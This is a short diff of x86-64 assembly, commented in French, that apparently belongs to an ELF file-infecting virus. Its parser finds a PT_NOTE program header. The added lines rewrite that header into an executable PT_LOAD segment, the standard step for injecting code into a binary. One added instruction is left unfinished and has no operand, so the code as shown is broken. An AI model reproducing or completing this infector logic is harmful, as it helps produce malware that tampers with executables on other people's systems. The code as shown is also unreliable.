@@ -86,14 +86,19 @@ _ok_pt_note:
 	lea rsi, [rel ok_pt_note_msg]
 	mov rdx, ok_pt_note_msg_len
 	call _print_msg
+	mov dword [r15+rbx], 0x1	; on transforme notre p_type en PT_LOAD
+	mov dword [r15+rbx+0x4], 0x5	; On accord permission RX à p_flags
+	mov qword [r15+rbx+0x8],
 	call _exit
 
 
 _loop_phdr:
-	add rbx, rdx
+	add rbx, rdx			; on passe au prochain phdr
 	dec rcx				; Decrémente le nombre de phdr
 	cmp dword [r15+rbx], 0x4	; On check si PT_NOTE (p_type == 0x4) 
-	je _ok_pt_note			; On a trouver un PT_NOTE phdr			; Sinon on check si il reste des phdr a comparer
+	je _ok_pt_note			; On a trouver un PT_NOTE phdr	
+		; Sinon on check si il reste des phdr a comparer
+	; 	gestion des erreurs pour le parsing
 	lea rsi, [rel error_pt_note_msg]
 	mov rdx, error_pt_note_msg_len
 	call _print_msg
